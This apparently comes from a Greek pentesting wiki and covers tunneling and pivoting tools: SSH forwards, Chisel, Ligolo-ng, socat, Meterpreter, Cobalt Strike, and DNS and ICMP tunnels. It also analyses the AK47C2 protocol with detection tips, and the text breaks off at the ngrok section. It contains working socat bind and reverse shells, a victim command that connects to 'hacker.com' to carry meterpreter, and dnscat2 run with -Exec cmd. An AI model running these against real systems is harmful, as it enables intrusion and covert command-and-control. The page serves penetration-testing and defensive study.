# Tunneling και Port Forwarding

## Συμβουλή για το Nmap

> [!WARNING]
> Η υποστήριξη proxy του Nmap περιορίζεται σε συνδέσεις TCP και δεν επηρεάζει τις σαρώσεις ping, θυρών ή ανίχνευσης OS. Όταν ο scanner βρίσκεται πίσω από SOCKS proxy, **απενεργοποιήστε την ανακάλυψη hosts** (`-Pn`) και χρησιμοποιήστε **TCP connect scan** (`-sT`).<sup>[[5]](#references)</sup>

## **Bash**

**Host -> Jump -> InternalA -> InternalB**

Η τελική εντολή χρησιμοποιεί τις επιλογές `-u` και `-i` του Evil-WinRM για να προσδιορίσει τον λογαριασμό και το WinRM host· η προεπιλεγμένη θύρα WinRM είναι η 5985.<sup>[[4]](#references)</sup>
```bash
# On the jump server connect the port 3333 to the 5985
mknod backpipe p;
nc -lvnp 5985 0<backpipe | nc -lvnp 3333 1>backpipe

# On InternalA accessible from Jump and can access InternalB
## Expose port 3333 and connect it to the winrm port of InternalB
exec 3<>/dev/tcp/internalB/5985
exec 4<>/dev/tcp/Jump/3333
cat <&3 >&4 &
cat <&4 >&3 &

# From the host, you can now access InternalB from the Jump server
evil-winrm -u username -i Jump
```
## **SSH**

Το OpenSSH μπορεί να προωθεί συνδέσεις X11, αυθαίρετες θύρες TCP και sockets τομέα Unix μέσω του κρυπτογραφημένου καναλιού του.<sup>[[6]](#references)</sup>

Γραφική σύνδεση SSH (X)

Το `-Y` ενεργοποιεί την αξιόπιστη προώθηση X11 και το `-C` ζητά συμπίεση για τα προωθούμενα δεδομένα.<sup>[[6]](#references)</sup>
```bash
ssh -Y -C <user>@<ip> #-Y is less secure but faster than -X
```
### Remote Port2Port

Άνοιγμα νέας θύρας στον SSH Server --> Άλλη θύρα

Το Remote (`-R`) forwarding ακούει στον SSH server και συνδέεται στην τοπική πλευρά· η ρητή bind address ελέγχει ποιες διεπαφές μπορούν να προσπελάσουν αυτόν τον listener.<sup>[[6]](#references)</sup>
```bash
ssh -R 0.0.0.0:10521:127.0.0.1:1521 user@10.0.0.1 #Local port 1521 accessible in port 10521 from everywhere
```

```bash
ssh -R 0.0.0.0:10521:10.0.0.1:1521 user@10.0.0.1 #Remote port 1521 accessible in port 10521 from everywhere
```
### Port2Port

Τοπική θύρα --> Compromised host (SSH) --> Third_box:Port

Η προώθηση Local (`-L`) ακούει στον client και συνδέεται στον προορισμό από την πλευρά του SSH server.<sup>[[6]](#references)</sup>
```bash
ssh -i ssh_key <user>@<ip_compromised> -L <attacker_port>:<ip_victim>:<remote_port> [-p <ssh_port>] [-N -f]  #This way the terminal is still in your host
#Example
sudo ssh -L 631:<ip_victim>:631 -N -f -l <username> <ip_compromised>
```
### Port2hostnet (proxychains)

Τοπική θύρα --> Παραβιασμένος host (SSH) --> Οπουδήποτε

Η δυναμική προώθηση (`-D`) δημιουργεί έναν τοπικό SOCKS4/SOCKS5 listener, του οποίου οι συνδέσεις ανοίγουν από την απομακρυσμένη πλευρά.<sup>[[6]](#references)</sup>
```bash
ssh -f -N -D <attacker_port> <username>@<ip_compromised> #All sent to local port will exit through the compromised server (use as proxy)
```
### Reverse Port Forwarding

Αυτό είναι χρήσιμο για τη λήψη reverse shells από εσωτερικούς hosts μέσω ενός DMZ προς το host σας:

Η ρύθμιση `GatewayPorts` του server ελέγχει αν ένα remote forward μπορεί να κάνει bind πέρα από το loopback· η προεπιλεγμένη τιμή της είναι `no`.<sup>[[7]](#references)</sup>
```bash
ssh -i dmz_key -R <dmz_internal_ip>:443:0.0.0.0:7000 root@10.129.203.111 -vN
# Now you can send a rev to dmz_internal_ip:443 and capture it in localhost:7000
# Note that port 443 must be open
# Also, remmeber to edit the /etc/ssh/sshd_config file on Ubuntu systems
# and change the line "GatewayPorts no" to "GatewayPorts yes"
# to be able to make ssh listen in non internal interfaces in the victim (443 in this case)
```
### VPN-Tunnel

Αυτό το παράδειγμα που βασίζεται στο `root` δημιουργεί συσκευές tunnel και στους δύο hosts. Ο server πρέπει να επιτρέπει το tun forwarding και ο επιλεγμένος λογαριασμός πρέπει να έχει πρόσβαση στη συσκευή tun· το `PermitRootLogin yes` είναι ένας τρόπος χρήσης του λογαριασμού `root` εδώ.<sup>[[6]](#references)[[7]](#references)</sup>\
`PermitRootLogin yes`\
`PermitTunnel yes`
```bash
ssh root@server -w any:any #This will create Tun interfaces in both devices
ip addr add 1.1.1.2/32 peer 1.1.1.1 dev tun0 #Client side VPN IP
ip link set tun0 up #Activate the client side network interface
ip addr add 1.1.1.1/32 peer 1.1.1.2 dev tun0 #Server side VPN IP
ip link set tun0 up #Activate the server side network interface
```
Ενεργοποίηση του forwarding στην πλευρά του Server
```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables -t nat -A POSTROUTING -s 1.1.1.2 -o eth0 -j MASQUERADE
```
Ορίστε ένα νέο route στην πλευρά του client
```
route add -net 10.0.0.0/16 gw 1.1.1.1
```
> [!NOTE]
> **Ασφάλεια – Terrapin Attack (CVE-2023-48795)**
> Το OpenSSH 9.6 πρόσθεσε ένα strict-KEX extension για την αντιμετώπιση του early-transport integrity attack του Terrapin. Ενημερώστε και τα δύο peers όπου είναι δυνατό και ακολουθήστε τις οδηγίες του vendor για παλαιότερες υλοποιήσεις, αντί να θεωρείτε ότι ένα forwarded channel προστατεύεται μόνο από την έκδοση.<sup>[[8]](#references)</sup>

## SSHUTTLE

Μπορείτε να **tunnel** μέσω **ssh** όλη την **traffic** προς ένα **subnetwork** μέσω ενός host.\
Για παράδειγμα, να κάνετε forwarding όλης της traffic που κατευθύνεται στο 10.10.10.0/24

Το `sshuttle` παρέχει transparent proxying μέσω SSH και υποστηρίζει την επιλογή subnetworks και μιας προσαρμοσμένης SSH εντολής, όπως φαίνεται παρακάτω.<sup>[[9]](#references)</sup>
```bash
pip install sshuttle
sshuttle -r user@host 10.10.10.10/24
```
Σύνδεση με ιδιωτικό κλειδί
```bash
sshuttle -D -r user@host 10.10.10.10 0/0 --ssh-cmd 'ssh -i ./id_rsa'
# -D : Daemon mode
```
## Meterpreter

Το `portfwd` του Metasploit υποστηρίζει τοπική και απομακρυσμένη προώθηση, ενώ το SOCKS proxy module προορίζεται για χρήση με session routes ή `autoroute` και, σε αυτά τα παραδείγματα, ακούει από προεπιλογή στη θύρα 1080.<sup>[[10]](#references)[[11]](#references)[[12]](#references)</sup>

### Port2Port

Τοπική θύρα --> Παραβιασμένος host (ενεργή session) --> Third_box:Port
```bash
# Inside a meterpreter session
portfwd add -l <attacker_port> -p <Remote_port> -r <Remote_host>
```
### SOCKS
```bash
background# meterpreter session
route add <IP_victim> <Netmask> <Session> # (ex: route add 10.10.10.14 255.255.255.0 8)
use auxiliary/server/socks_proxy
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
Ένας άλλος τρόπος:
```bash
background #meterpreter session
use post/multi/manage/autoroute
set SESSION <session_n>
set SUBNET <New_net_ip> #Ex: set SUBNET 10.1.13.0
set NETMASK <Netmask>
run
use auxiliary/server/socks_proxy
set VERSION 4a
run #Proxy port 1080 by default
echo "socks4 127.0.0.1 1080" > /etc/proxychains.conf #Proxychains
```
## Cobalt Strike

Το Beacon του Cobalt Strike μπορεί να προωθεί συνδέσεις SOCKS4a/SOCKS5 μέσω ενός Beacon· το `rportfwd` δεσμεύει μια θύρα στον compromised host, ενώ το `rportfwd_local` ξεκινά τη σύνδεση προς τον προορισμό από τον Cobalt Strike client.<sup>[[13]](#references)[[14]](#references)</sup>

### SOCKS proxy

Ανοίξτε μια θύρα στο Team Server στις διεπαφές μέσω των οποίων θα δρομολογείται η κίνηση μέσω του Beacon.<sup>[[13]](#references)</sup>
```bash
beacon> socks 1080
[+] started SOCKS4a server on: 1080

# Set port 1080 as proxy server in proxychains.conf
proxychains nmap -n -Pn -sT -p445,3389,5985 10.10.17.25
```
### rPort2Port

> [!WARNING]
> Σε αυτή την περίπτωση, η **θύρα ανοίγει στον Beacon host**, όχι στον Team Server, και η κίνηση αποστέλλεται στον Team Server και από εκεί στον υποδεικνυόμενο host:port.<sup>[[14]](#references)</sup>
```bash
rportfwd [bind port] [forward host] [forward port]
rportfwd stop [bind port]
```
Το manual του reverse-forwarding σημειώνει την ακόλουθη συμπεριφορά:<sup>[[14]](#references)</sup>

- Το reverse port forward του Beacon έχει σχεδιαστεί για **tunnel traffic προς το Team Server και όχι για relaying μεταξύ μεμονωμένων machines**.
- Το traffic **tunneled μέσα στο C2 traffic του Beacon**, συμπεριλαμβανομένων των P2P links.
- Τα υψηλά ports συνήθως αποφεύγουν τους περιορισμούς των privileged ports, αλλά εξακολουθούν να ισχύουν η πολιτική του target OS και οι υπάρχοντες listeners.

### rPort2Port local

> [!WARNING]
> Σε αυτήν την περίπτωση, το **port ανοίγει στο Beacon host**, όχι στο Team Server, και το **traffic αποστέλλεται στον Cobalt Strike client** (όχι στο Team Server) και από εκεί στο υποδεικνυόμενο host:port.<sup>[[14]](#references)</sup>
```bash
rportfwd_local [bind port] [forward host] [forward port]
rportfwd_local stop [bind port]
```
## reGeorg

[https://github.com/sensepost/reGeorg](https://github.com/sensepost/reGeorg)

Το project παρέχει endpoints για web tunnel, όπως `tunnel.aspx`, `tunnel.ashx`, `tunnel.jsp` και `tunnel.php`. Ανεβάστε ένα υποστηριζόμενο endpoint πριν εκκινήσετε το local proxy.<sup>[[15]](#references)</sup>
```bash
python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp
```
## Chisel

Μπορείτε να το κατεβάσετε από τη σελίδα releases του [https://github.com/jpillora/chisel](https://github.com/jpillora/chisel)\
Το Chisel μεταφέρει κίνηση TCP/UDP μέσω HTTP χρησιμοποιώντας σύνδεση προστατευμένη με SSH· χρησιμοποιήστε συμβατές εκδόσεις client/server και επαληθεύστε τη σύνταξη εντολών της επιλεγμένης έκδοσης.<sup>[[16]](#references)</sup>

### socks
```bash
./chisel server -p 8080 --reverse #Server -- Attacker
./chisel-x64.exe client 10.10.14.3:8080 R:socks #Client -- Victim
#And now you can use proxychains with port 1080 (default)

./chisel server -v -p 8080 --socks5 #Server -- Victim (needs to have port 8080 exposed)
./chisel client -v 10.10.10.10:8080 socks #Attacker
```
### Port forwarding
```bash
./chisel_1.7.6_linux_amd64 server -p 12312 --reverse #Server -- Attacker
./chisel_1.7.6_linux_amd64 client 10.10.14.20:12312 R:4505:127.0.0.1:4505 #Client -- Victim
```
## Ligolo-ng

[https://github.com/nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)

Το quickstart του Ligolo-ng περιγράφει ένα interface TUN στον proxy, validation του certificate-fingerprint για τον agent και ρύθμιση route για το tunneled network.<sup>[[17]](#references)</sup>

### Tunneling
```bash
# Start proxy server and automatically generate self-signed TLS certificates -- Attacker
sudo ./proxy -selfcert
# Create an interface named "ligolo" -- Attacker
interface_create --name "ligolo"
# Print the currently used certificate fingerprint -- Attacker
certificate_fingerprint
# Start the agent with certification validation -- Victim
./agent -connect <ip_proxy>:11601 -v -accept-fingerprint <fingerprint>
# Select the agent -- Attacker
session
1
# Start the tunnel on the proxy server -- Attacker
tunnel_start --tun "ligolo"
# Display the agent's network configuration -- Attacker
ifconfig
# Create a route to the agent's specified network -- Attacker
interface_add_route --name "ligolo" --route <network_address_agent>/<netmask_agent>
# Display the tun interfaces -- Attacker
interface_list
```
### Binding και Listening του Agent

Το Ligolo-ng μπορεί να προσθέσει listeners στο agent, οι οποίοι προωθούν σε μια διεύθυνση στην πλευρά του proxy, ενώ το δεσμευμένο εύρος `240.0.0.0/4` μπορεί να δρομολογηθεί για πρόσβαση σε υπηρεσίες τοπικές στον agent.<sup>[[18]](#references)[[19]](#references)</sup>
```bash
# Establish a tunnel from the proxy server to the agent
# Create a TCP listening socket on the agent (0.0.0.0) on port 30000 and forward incoming TCP connections to the proxy (127.0.0.1) on port 10000 -- Attacker
listener_add --addr 0.0.0.0:30000 --to 127.0.0.1:10000 --tcp
# Display the currently running listeners on the agent -- Attacker
listener_list
```
### Πρόσβαση στις τοπικές θύρες του Agent
```bash
# Establish a tunnel from the proxy server to the agent
# Create a route to redirect traffic for 240.0.0.1 to the Ligolo-ng interface to access the agent's local services -- Attacker
interface_add_route --name "ligolo" --route 240.0.0.1/32
```
## Rpivot

[https://github.com/klsecservices/rpivot](https://github.com/klsecservices/rpivot)

Το Rpivot ξεκινά το reverse tunnel από το θύμα και εκθέτει ένα SOCKS4 proxy στη διεύθυνση loopback του επιτιθέμενου· το README του τεκμηριώνει επίσης credentials για NTLM-proxy και επιλογές hash.<sup>[[20]](#references)</sup>
```bash
attacker> python server.py --server-port 9999 --server-ip 0.0.0.0 --proxy-ip 127.0.0.1 --proxy-port 1080
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999
```
Pivot μέσω **NTLM proxy**
```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --password P@ssw0rd
```

```bash
victim> python client.py --server-ip <rpivot_server_ip> --server-port 9999 --ntlm-proxy-ip <proxy_ip> --ntlm-proxy-port 8080 --domain CONTOSO.COM --username Alice --hashes 9b9850751be2515c8231e5189015bbe6:49ef7638d69a01f26d96ed673bf50c45
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

Το Socat συνδυάζει τύπους διευθύνσεων όπως `TCP-LISTEN`, `EXEC`, `SOCKS4A`, `OPENSSL` και `PROXY`· τα παρακάτω παραδείγματα συνδυάζουν αυτά τα τεκμηριωμένα endpoints.<sup>[[21]](#references)</sup>

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP4:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
### Port2Port
```bash
socat TCP4-LISTEN:<lport>,fork TCP4:<redirect_ip>:<rport> &
```
### Port2Port μέσω socks
```bash
socat TCP4-LISTEN:1234,fork SOCKS4A:127.0.0.1:google.com:80,socksport=5678
```
### Meterpreter μέσω SSL Socat
```bash
#Create meterpreter backdoor to port 3333 and start msfconsole listener in that port
attacker> socat OPENSSL-LISTEN:443,cert=server.pem,cafile=client.crt,reuseaddr,fork,verify=1 TCP:127.0.0.1:3333
```

```bash
victim> socat.exe TCP-LISTEN:2222 OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|TCP:hacker.com:443,connect-timeout=5
#Execute the meterpreter
```
Μπορείτε να παρακάμψετε έναν **μη πιστοποιημένο proxy** με τον τεκμηριωμένο τύπο διεύθυνσης `PROXY` του socat, εκτελώντας αυτήν τη γραμμή αντί για την τελευταία στην κονσόλα του θύματος.<sup>[[21]](#references)</sup>
```bash
OPENSSL,verify=1,cert=client.pem,cafile=server.crt,connect-timeout=5|PROXY:hacker.com:443,connect-timeout=5|TCP:proxy.lan:8080,connect-timeout=5
```
[https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/](https://funoverip.net/2011/01/reverse-ssl-backdoor-with-socat-and-metasploit/)

### SSL Socat Tunnel

**/bin/sh console**

Δημιουργήστε πιστοποιητικά και στις δύο πλευρές: Client και Server
```bash
# Execute these commands on both sides
FILENAME=socatssl
openssl genrsa -out $FILENAME.key 1024
openssl req -new -key $FILENAME.key -x509 -days 3653 -out $FILENAME.crt
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
chmod 600 $FILENAME.key $FILENAME.pem
```

```bash
attacker-listener> socat OPENSSL-LISTEN:433,reuseaddr,cert=server.pem,cafile=client.crt EXEC:/bin/sh
victim> socat STDIO OPENSSL-CONNECT:localhost:433,cert=client.pem,cafile=server.crt
```
### Remote Port2Port

Συνδέστε την τοπική θύρα SSH (22) με τη θύρα 443 του attacker host
```bash
attacker> sudo socat TCP4-LISTEN:443,reuseaddr,fork TCP4-LISTEN:2222,reuseaddr #Redirect port 2222 to port 443 in localhost
victim> while true; do socat TCP4:<attacker>:443 TCP4:127.0.0.1:22 ; done # Establish connection with the port 443 of the attacker and everything that comes from here is redirected to port 22
attacker> ssh localhost -p 2222 -l www-data -i vulnerable #Connects to the ssh of the victim
```
## Plink.exe

Το Plink είναι το command-line εργαλείο σύνδεσης του PuTTY, με επιλογές SSH forwarding παρόμοιες με το `ssh`.<sup>[[22]](#references)</sup>

Χρησιμοποιήστε το κεφαλαίο `-P` για τη θύρα SSH. Το `-pw` διατηρείται για συμβατότητα, αλλά εκθέτει τον κωδικό πρόσβασης στη λίστα διεργασιών· προτιμήστε authentication με κλειδί ή το `-pwfile` όπου είναι δυνατόν.<sup>[[22]](#references)[[23]](#references)</sup>

Καθώς αυτό το binary θα εκτελεστεί στο θύμα και είναι SSH client, ανοίξτε την υπηρεσία και τη θύρα SSH για την reverse σύνδεση· το παρακάτω χρησιμοποιεί το `-R` για να προωθήσει μια τοπικά προσβάσιμη θύρα στο μηχάνημα του επιτιθέμενου.<sup>[[22]](#references)</sup>
```bash
echo y | plink.exe -l <Our_valid_username> -pw <valid_password> [-P <port>] -R <port_ in_our_host>:<next_ip>:<final_port> <your_ip>
echo y | plink.exe -l root -pw password [-P 2222] -R 9090:127.0.0.1:9090 10.11.0.41 #Local port 9090 to out port 9090
```
## Windows netsh

### Port2Port

Χρησιμοποιήστε ένα context με τα απαιτούμενα permissions από το host κατά τη δημιουργία ή την αλλαγή επίμονων κανόνων `portproxy`. Η Microsoft τεκμηριώνει τις μορφές add, show και delete του `v4tov4` που χρησιμοποιούνται παρακάτω.<sup>[[24]](#references)</sup>
```bash
netsh interface portproxy add v4tov4 listenaddress= listenport= connectaddress= connectport= protocol=tcp
# Example:
netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=4444 connectaddress=10.10.10.10 connectport=4444
# Check the port forward was created:
netsh interface portproxy show v4tov4
# Delete port forward
netsh interface portproxy delete v4tov4 listenaddress=0.0.0.0 listenport=4444
```
## SocksOverRDP & Proxifier

Πρέπει να έχετε **RDP πρόσβαση στο σύστημα**.\
Λήψη:

Το SocksOverRDP χρησιμοποιεί Remote Desktop Dynamic Virtual Channels για τη μεταφορά μιας σύνδεσης SOCKS5 μέσω μιας υπάρχουσας συνεδρίας RDP. Το client plugin ακούει στη διεύθυνση `127.0.0.1:1080`, ενώ το server component εκτελείται στον στόχο RDP.<sup>[[25]](#references)</sup>

1. [SocksOverRDP x64 Binaries](https://github.com/nccgroup/SocksOverRDP/releases) - Αυτό το tool χρησιμοποιεί `Dynamic Virtual Channels` (`DVC`) από το feature Remote Desktop Service των Windows. Το DVC είναι υπεύθυνο για **τη διοχέτευση packets μέσω της σύνδεσης RDP**.
2. [Φορητό Binary του Proxifier](https://www.proxifier.com/download/#win-tab)

Στον client υπολογιστή σας φορτώστε το **`SocksOverRDP-Plugin.dll`** ως εξής:
```bash
# Load SocksOverRDP.dll using regsvr32.exe
C:\SocksOverRDP-x64> regsvr32.exe SocksOverRDP-Plugin.dll
```
Τώρα μπορούμε να **συνδεθούμε** στο **victim** μέσω **RDP** χρησιμοποιώντας το **`mstsc.exe`** και θα πρέπει να λάβουμε ένα **μήνυμα** που θα αναφέρει ότι το **SocksOverRDP plugin** είναι ενεργοποιημένο και θα **ακούει** στο **127.0.0.1:1080**.

**Συνδεθείτε** μέσω **RDP** και ανεβάστε και εκτελέστε στο μηχάνημα του victim το binary `SocksOverRDP-Server.exe`:
```
C:\SocksOverRDP-x64> SocksOverRDP-Server.exe
```
Τώρα, επιβεβαίωσε στο μηχάνημά σου (attacker) ότι η θύρα 1080 βρίσκεται σε κατάσταση ακρόασης:
```
netstat -antb | findstr 1080
```
Τώρα μπορείτε να χρησιμοποιήσετε το [**Proxifier**](https://www.proxifier.com/) για να κάνετε proxy την κίνηση μέσω αυτής της θύρας.<sup>[[26]](#references)</sup>

## Proxify εφαρμογές Windows GUI

Μπορείτε να κάνετε τις εφαρμογές Windows GUI να περιηγούνται μέσω proxy χρησιμοποιώντας το [**Proxifier**](https://www.proxifier.com/).<sup>[[26]](#references)</sup>\
Στο **Profile -> Proxy Servers** προσθέστε την IP και τη θύρα του SOCKS server.\
Στο **Profile -> Proxification Rules** προσθέστε το όνομα του προγράμματος που θέλετε να κάνετε proxify και τις συνδέσεις προς τις IP που θέλετε να κάνετε proxify· οι κανόνες του Proxifier μπορούν να αντιστοιχούν σε εφαρμογές, hosts-στόχους και θύρες.<sup>[[27]](#references)</sup>

## Tunnel μέσω proxy NTLM

Το εργαλείο που αναφέρθηκε προηγουμένως, το **Rpivot**, μπορεί να κάνει relay μέσω proxy που πραγματοποιεί authentication με NTLM. Το **OpenVPN** μπορεί επίσης να δρομολογεί μέσω proxy όταν έχει ρυθμιστεί με αρχείο auth και τη μέθοδο NTLMv2· αυτό είναι proxy traversal και όχι παράκαμψη του proxy authentication.<sup>[[20]](#references)[[28]](#references)</sup>
```bash
http-proxy <proxy_ip> 8080 <file_with_creds> ntlm2
```
### Cntlm

[http://cntlm.sourceforge.net/](http://cntlm.sourceforge.net/)

Το Cntlm πραγματοποιεί authentication σε upstream NTLM proxies, εκθέτει local listeners και μπορεί να αντιστοιχίσει μια local tunnel port σε μια destination service· στη συνέχεια, οι clients μπορούν να χρησιμοποιούν αυτήν τη local port.<sup>[[29]](#references)</sup>\
Για παράδειγμα, αυτή η προώθηση της port 443
```
Username Alice
Password P@ssw0rd
Domain CONTOSO.COM
Proxy 10.0.0.10:8080
Tunnel 2222:<attackers_machine>:443
```
Τώρα, αν ορίσετε, για παράδειγμα, στην victim την υπηρεσία **SSH** να ακούει στη θύρα 443, μπορείτε να συνδεθείτε σε αυτήν μέσω της θύρας 2222 του attacker.<sup>[[29]](#references)</sup>\
Θα μπορούσατε επίσης να χρησιμοποιήσετε ένα **meterpreter** που συνδέεται στο localhost:443, ενώ ο attacker ακούει στη θύρα 2222.<sup>[[29]](#references)</sup>

## YARP

Το YARP (Yet Another Reverse Proxy) είναι το .NET toolkit της Microsoft για reverse proxy. Μπορείτε να το βρείτε εδώ: [https://github.com/microsoft/reverse-proxy](https://github.com/microsoft/reverse-proxy).<sup>[[30]](#references)</sup>

## DNS Tunneling

### Iodine

[https://code.kryo.se/iodine/](https://code.kryo.se/iodine/)

Το Iodine δημιουργεί ένα IPv4 tunnel μέσω DNS queries και χρησιμοποιεί TUN interfaces· το τεκμηριωμένο setup απαιτεί τα απαραίτητα privileges για τη δημιουργία αυτών των interfaces και στα δύο άκρα.<sup>[[31]](#references)</sup>
```
attacker> iodined -f -c -P P@ssw0rd 1.1.1.1 tunneldomain.com
victim> iodine -f -P P@ssw0rd tunneldomain.com -r
#You can see the victim at 1.1.1.2
```
Η μεταφορά μέσω DNS έχει μεγαλύτερο overhead από το απευθείας TCP και είναι συνήθως αργή· μπορείτε να δημιουργήσετε μια συμπιεσμένη σύνδεση SSH μέσω αυτού του tunnel χρησιμοποιώντας:<sup>[[31]](#references)</sup>
```
ssh <user>@1.1.1.2 -C -c blowfish-cbc,arcfour -o CompressionLevel=9 -D 1080
```
### DNSCat2

[**Κατεβάστε το από εδώ**](https://github.com/iagox86/dnscat2)**.**

Το Dnscat2 δημιουργεί ένα κρυπτογραφημένο command-and-control κανάλι μέσω DNS· οι εντολές server και client παρακάτω ακολουθούν την τεκμηριωμένη χρήση του.<sup>[[32]](#references)</sup>
```bash
attacker> ruby ./dnscat2.rb tunneldomain.com
victim> ./dnscat2 tunneldomain.com

# If using it in an internal network for a CTF:
attacker> ruby dnscat2.rb --dns host=10.10.10.10,port=53,domain=mydomain.local --no-cache
victim> ./dnscat2 --dns host=10.10.10.10,port=5353
```
#### **Στο PowerShell**

Μπορείτε να χρησιμοποιήσετε το [**dnscat2-powershell**](https://github.com/lukebaggett/dnscat2-powershell) για να εκτελέσετε έναν client του dnscat2 στο PowerShell· το README του τεκμηριώνει τις παραμέτρους του `Start-Dnscat2` που εμφανίζονται παρακάτω.<sup>[[33]](#references)</sup>
```
Import-Module .\dnscat2.ps1
Start-Dnscat2 -DNSserver 10.10.10.10 -Domain mydomain.local -PreSharedSecret somesecret -Exec cmd
```
#### **Port forwarding με dnscat**

Η διαδραστική εντολή `listen` του Dnscat2 αντιστοιχίζει έναν local listener σε έναν remote host και port.<sup>[[32]](#references)</sup>
```bash
session -i <sessions_id>
listen [lhost:]lport rhost:rport #Ex: listen 127.0.0.1:8080 10.0.0.20:80, this bind 8080port in attacker host
```
#### Αλλαγή proxychains DNS

Το Proxychains-ng συνδέεται δυναμικά με TCP connections και δεν μπορεί να μεταφέρει UDP ή ICMP· το DNS proxying είναι παραμετροποιήσιμο, επομένως ελέγξτε το εγκατεστημένο `proxychains.conf` και το resolver helper αντί να υποθέτετε έναν σταθερό public resolver. Τα legacy `proxyresolv` scripts εκθέτουν το `PROXY_DNS_SERVER` για την επιλογή του resolver· χρησιμοποιήστε έναν resolver που είναι προσβάσιμος από το pivot όταν απαιτούνται internal names.<sup>[[34]](#references)[[35]](#references)</sup>

## Tunnels σε Go

[https://github.com/hotnops/gtunnel](https://github.com/hotnops/gtunnel)

### Custom DNS TXT / HTTP JSON C2 (AK47C2)

Ο actor Storm-2603 δημιούργησε ένα **dual-channel C2 ("AK47C2")** που κάνει abuse *μόνο* σε εξερχόμενη κίνηση **DNS** και **plain HTTP POST** – δύο πρωτόκολλα που σπάνια μπλοκάρονται σε εταιρικά δίκτυα.<sup>[[2]](#references)</sup>

1. **DNS mode (AK47DNS)**
• Δημιουργεί ένα τυχαίο SessionID 5 χαρακτήρων (π.χ. `H4T14`).
• Προσθέτει το `1` για *αιτήματα εργασιών* ή το `2` για *αποτελέσματα* και ενώνει διαφορετικά πεδία (flags, SessionID, όνομα υπολογιστή).
• Κάθε πεδίο **κρυπτογραφείται με XOR με το ASCII key `VHBD@H`**, κωδικοποιείται σε hex και ενώνεται με τελείες – καταλήγοντας τελικά στο domain που ελέγχει ο attacker:

```text
<1|2><SessionID>.a<SessionID>.<Computer>.update.updatemicfosoft.com
```

• Τα requests χρησιμοποιούν `DnsQuery()` για records **TXT** (και fallback **MG**).
• Όταν η απάντηση ξεπερνά τα 0xFF bytes, το backdoor **κατακερματίζει** τα δεδομένα σε τμήματα των 63 bytes και εισάγει τους markers:
`s<SessionID>t<TOTAL>p<POS>` ώστε ο C2 server να μπορεί να τα αναδιατάξει.

2. **HTTP mode (AK47HTTP)**
• Δημιουργεί ένα JSON envelope:
```json
{"cmd":"","cmd_id":"","fqdn":"<host>","result":"","type":"task"}
```
• Ολόκληρο το blob γίνεται XOR με `VHBD@H` → hex → και αποστέλλεται ως body ενός **`POST /`** με header `Content-Type: text/plain`.
• Η απάντηση ακολουθεί την ίδια κωδικοποίηση και το πεδίο `cmd` εκτελείται με `cmd.exe /c <command> 2>&1`.

Σημειώσεις Blue Team
• Αναζητήστε ασυνήθιστα **TXT queries** των οποίων το πρώτο label είναι μεγάλο hexadecimal και καταλήγουν πάντα σε ένα σπάνιο domain.
• Ένα σταθερό XOR key ακολουθούμενο από ASCII-hex ανιχνεύεται εύκολα με YARA: `6?56484244?484` (`VHBD@H` σε hex).
• Για HTTP, επισημάνετε text/plain POST bodies που αποτελούνται αποκλειστικά από hex και έχουν μήκος πολλαπλάσιο των δύο bytes.

{{#note}}
Το channel διατηρεί κάθε sub-domain label εντός του ορίου των 63 octets του DNS, όμως η συμμόρφωση με το protocol από μόνη της δεν το καθιστά stealthy· τα σπάνια domains, τα μεγάλα hexadecimal labels και ο όγκος των queries παραμένουν detection signals.<sup>[[2]](#references)[[36]](#references)</sup>
{{#endnote}}

## ICMP Tunneling

### Hans

[https://github.com/friedrich/hans](https://github.com/friedrich/hans)\
[https://github.com/albertzak/hanstunnel](https://github.com/albertzak/hanstunnel)

Το Hans τεκμηριώνει ένα IPv4-over-ICMP tunnel που χρησιμοποιεί συσκευή TUN και ICMP echo requests· η ρύθμιση απαιτεί επαρκή privileges για τη δημιουργία του interface.<sup>[[37]](#references)</sup>
```bash
./hans -v -f -s 1.1.1.1 -p P@ssw0rd #Start listening (1.1.1.1 is IP of the new vpn connection)
./hans -f -c <server_ip> -p P@ssw0rd -v
ping 1.1.1.100 #After a successful connection, the victim will be in the 1.1.1.100
```
### ptunnel-ng

[**Κατεβάστε το από εδώ**](https://github.com/utoni/ptunnel-ng.git).

Το ptunnel-ng μεταφέρει συνδέσεις TCP μέσω ICMP και χρησιμοποιεί τις επιλογές `-p`, `-l`, `-r` και `-R`, οι οποίες εμφανίζονται παρακάτω, για το proxy, τον local listener, τον host προορισμού και τη θύρα προορισμού αντίστοιχα.<sup>[[38]](#references)</sup>
```bash
# Generate it
sudo ./autogen.sh

# Server -- victim (needs to be able to receive ICMP)
sudo ptunnel-ng
# Client - Attacker
sudo ptunnel-ng -p <server_ip> -l <listen_port> -r <dest_ip> -R <dest_port>
# Try to connect with SSH through ICMP tunnel
ssh -p 2222 -l user 127.0.0.1
# Create a socks proxy through the SSH connection through the ICMP tunnel
ssh -D 9050 -p 2222 -l user 127.0.0.1
```
## ngrok

Το [**ngrok**](https://ngrok.com/) είναι ένας agent για τη δημοσίευση τοπικών network services online μέσω ενός ασφαλούς tunnel· το CLI τεκμηριώνει endpoints για HTTP, TCP και file URL, ενώ το hostname του endpoint που εμφανίζεται μπορεί να διαφέρει ανάλογα με το endpoint και τον λογαριασμό.<sup>[[39]](#references)</sup>

### Εγκατάσταση

- Δημιουργία λογαριασμού: https://ngrok.com/signup
- Λήψη client:
```bash
